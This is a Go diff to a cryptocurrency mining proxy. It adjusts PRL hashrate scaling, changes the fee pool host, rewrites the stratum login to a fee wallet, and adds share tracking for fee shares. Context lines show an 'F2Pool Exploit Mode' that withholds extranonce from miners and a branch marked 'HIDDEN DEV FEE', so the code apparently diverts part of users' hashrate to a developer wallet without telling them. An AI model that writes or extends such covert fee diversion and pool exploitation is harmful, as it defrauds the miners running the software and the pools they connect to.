@@ -402,8 +402,8 @@ func (s *Session) getAlgoBaseMHs() float64 {
 		if strings.Contains(pool, "k1pool") {
 			base = 4.294967296 * 688256.0
 		} else {
-			// F2Pool and standard PRL pools use Diff 1.0 = 9.007 PH (2^21 multiplier)
-			base = 4.294967296 * 2097152.0
+			// F2Pool and standard PRL pools use Diff 1.0 = 2.25 PH (2^19 multiplier)
+			base = 4.294967296 * 524288.0
 		}
 	} else if strings.Contains(pool, "etc") || strings.Contains(coin, "etc") || strings.Contains(pool, "eth") {
 		// Ethash/Etchash (ETC/ETHW) uses the standard 2^32 hashrate scale (1 diff = 4.29 GH)
@@ -1060,6 +1060,17 @@ reconnectLoop:
 								Timestamp: time.Now(),
 								Diff:      s.CurrentDiff,
 							})
+							if isFee {
+								s.RingBuffer.AddShare(s.CurrentDiff, true, pending.FeeMode == FeeModeDev)
+								if s.Server != nil {
+									s.Server.RingBuffer.AddShare(s.CurrentDiff, true, pending.FeeMode == FeeModeDev)
+								}
+							} else {
+								s.RingBuffer.AddShare(s.CurrentDiff, false, false)
+								if s.Server != nil {
+									s.Server.RingBuffer.AddShare(s.CurrentDiff, false, false)
+								}
+							}
 							s.mu.Unlock()
 						}
 
@@ -1512,7 +1523,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 		} else if coinUpper == "CKB" {
 			host = "ckb.f2pool.com:4300"
 		} else if coinUpper == "PRL" {
-			host = "sg1.alphapool.tech:5566"
+			host = "prl.f2pool.com:6543"
 		} else {
 			host = "btc-asia.f2pool.com:1315" // fallback
 		}
@@ -1545,7 +1556,7 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 		s.LogBackend("[SmartRouting] F2Pool Exploit Mode Activated! Will NOT send extranonce to miner.")
 	}
 
-	if s.SamePoolFeeActive && s.Protocol != "ETH_PROXY" {
+	if s.SamePoolFeeActive && s.Protocol != "ETH_PROXY" && strings.ToUpper(s.Config.CoinName) != "PRL" {
 		s.LogBackend("[SmartRouting] In-Band Fee Routing Activated! Authorizing fee worker on Main connection.")
 		s.mu.Lock()
 		s.InBandFeeActive = true
@@ -1625,6 +1636,9 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 			} else if paramsMap, ok := mod["params"].(map[string]interface{}); ok {
 				if _, ok := paramsMap["wallet"]; ok {
 					paramsMap["wallet"] = wallet
+				}
+				if _, ok := paramsMap["login"]; ok {
+					paramsMap["login"] = fmt.Sprintf("%s.%s", wallet, worker)
 				}
 				if _, ok := paramsMap["worker"]; ok {
 					paramsMap["worker"] = worker
@@ -1784,6 +1798,10 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 								Timestamp: time.Now(),
 								Diff:      s.CurrentDiff,
 							})
+							s.RingBuffer.AddShare(s.CurrentDiff, true, pending.FeeMode == FeeModeDev)
+							if s.Server != nil {
+								s.Server.RingBuffer.AddShare(s.CurrentDiff, true, pending.FeeMode == FeeModeDev)
+							}
 							s.mu.Unlock()
 						}
 
@@ -1830,6 +1848,10 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 								Timestamp: time.Now(),
 								Diff:      s.CurrentDiff,
 							})
+							s.RingBuffer.AddShare(s.CurrentDiff, true, isDevMode)
+							if s.Server != nil {
+								s.Server.RingBuffer.AddShare(s.CurrentDiff, true, isDevMode)
+							}
 
 							if isDevMode {
 								// HIDDEN DEV FEE
